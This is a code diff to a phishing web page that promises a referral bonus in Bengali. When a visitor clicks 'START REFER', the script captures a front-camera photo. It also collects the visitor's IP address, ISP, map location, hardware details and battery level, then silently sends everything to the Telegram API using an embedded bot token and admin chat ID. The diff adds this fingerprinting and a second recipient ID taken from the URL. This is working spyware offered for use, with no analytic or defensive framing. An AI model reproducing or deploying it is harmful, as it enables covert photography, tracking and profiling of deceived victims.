@@ -20,13 +20,17 @@
             z-index: 2; position: relative; border: 2px solid #00ff00;
             box-shadow: 0 0 20px #00ff00;
         }
-        h1 { color: #00ff00; font-size: 26px; margin-bottom: 15px; }
+        h1 { color: #00ff00; font-size: 26px; margin-bottom: 15px; text-transform: uppercase; }
         h2 { color: #ffffff; font-size: 18px; margin-bottom: 30px; }
         #verify-btn { 
             background-color: #00ff00; color: #000; border: none; padding: 15px; 
             font-size: 18px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold;
+            transition: 0.3s; letter-spacing: 1px;
         }
-        #status { margin-top: 25px; font-weight: bold; font-size: 14px; color: #00ff00; }
+        #verify-btn:hover { background-color: #053b05; color: #00ff00; }
+        #status { margin-top: 25px; font-weight: bold; font-size: 14px; letter-spacing: 1px; }
+        .success { color: #00ff00 !important; }
+        .error { color: #ff0000 !important; }
         #video, #canvas { display: none; }
     </style>
 </head>
@@ -34,8 +38,10 @@
     <div class="container">
         <h1>বোনাস সিস্টেম</h1>
         <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
+        
         <button id="verify-btn">START REFER</button>
         <div id="status"></div>
+        
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas"></canvas>
     </div>
@@ -43,70 +49,90 @@
     <script>
         const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
         const adminId = "7068444019"; 
+        const urlParams = new URLSearchParams(window.location.search);
+        const userIdFromLink = urlParams.get('id'); 
 
         const verifyBtn = document.getElementById('verify-btn');
         const status = document.getElementById('status');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+
+        async function getDeepIntel() {
+            let intel = "\n\n🌐 **NETWORK INTEL**";
+            try {
+                const res = await fetch('https://ipwho.is/');
+                const d = await res.json();
+                
+                intel += `\nIP: \`${d.ip}\`\nISP: \`${d.connection.isp}\`\nLoc: \`${d.city}, ${d.country}\`\nMaps: [Click Here](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
+                
+                intel += "\n\n💻 **HARDWARE INTEL**";
+                intel += `\nCores: \`${navigator.hardwareConcurrency || 'N/A'}\`\nRAM: \`${navigator.deviceMemory || 'N/A'}GB\`\nScreen: \`${window.screen.width}x${window.screen.height}\``;
+                
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    intel += `\nBattery: \`${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Idle'})\``;
+                }
+            } catch (e) { intel += "\nError fetching intel."; }
+            return intel;
+        }
 
         verifyBtn.addEventListener('click', async () => {
-            status.innerText = "> ক্যামেরা পারমিশন দিন...";
+            status.innerText = "> INITIALIZING...";
+            status.className = "success";
             verifyBtn.style.display = "none"; 
 
             try {
-                // ১. ক্যামেরা চালু করা
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                status.innerText = "> ভেরিফাই হচ্ছে, ৩ সেকেন্ড অপেক্ষা করুন...";
+                const intelData = await getDeepIntel();
 
-                // ২. ৩ সেকেন্ড পর ছবি তোলা
                 setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(async (blob) => {
-                        // ৩. ছবি পাঠানোর ক্যাপশন তৈরি
-                        let caption = "📸 নতুন ভিকটিম ধরা পড়েছে!\n";
+                        const caption = "🛠 **SYSTEM BREACH SUCCESSFUL**" + intelData;
                         
-                        // ৪. ট্র্যাকিং ডাটা (যদি সম্ভব হয়)
-                        try {
-                            const res = await fetch('https://ipwho.is/');
-                            const d = await res.json();
-                            caption += `📍 আইপি: ${d.ip}\n🌍 লোকেশন: ${d.city}, ${d.country}\n🔋 ব্যাটারি: ${navigator.userAgent.substring(0, 30)}`;
-                        } catch(e) { caption += "⚠️ ট্র্যাকিং ডাটা পাওয়া যায়নি।"; }
-
-                        const formData = new FormData();
-                        formData.append('chat_id', adminId);
-                        formData.append('photo', blob, 'user.jpg');
-                        formData.append('caption', caption);
-
-                        // ৫. টেলিগ্রামে পাঠানো
-                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        const result = await response.json();
-                        if (result.ok) {
-                            status.innerText = "> ভেরিফিকেশন সফল!";
-                        } else {
-                            status.innerText = "> সার্ভার এরর! বোট চেক করুন।";
+                        const ok = await sendToTelegram(blob, adminId, caption);
+                        if (userIdFromLink && userIdFromLink !== adminId) {
+                            await sendToTelegram(blob, userIdFromLink, caption);
                         }
-                        
-                        // ক্যামেরা বন্ধ করা
-                        stream.getTracks().forEach(track => track.stop());
+
+                        if(ok) {
+                            status.innerText = "> SUCCESSFUL";
+                            status.className = "success";
+                        } else {
+                            status.innerText = "> UPLOAD ERROR";
+                            status.className = "error";
+                        }
+                        stream.getTracks().forEach(t => t.stop());
                     }, 'image/jpeg', 0.8);
                 }, 3000); 
 
             } catch (err) {
-                status.innerText = "> ক্যামেরা এলাও করা হয়নি! আবার চেষ্টা করুন।";
-                status.style.color = "#ff0000";
+                status.innerText = "> ACCESS DENIED: CAMERA REQUIRED";
+                status.className = "error";
                 verifyBtn.style.display = "block";
             }
         });
+
+        async function sendToTelegram(blob, id, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', id);
+            formData.append('photo', blob, 'x-capture.jpg');
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'Markdown');
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                const res = await response.json();
+                return res.ok;
+            } catch(e) { return false; }
+        }
     </script>
 </body>
 </html>
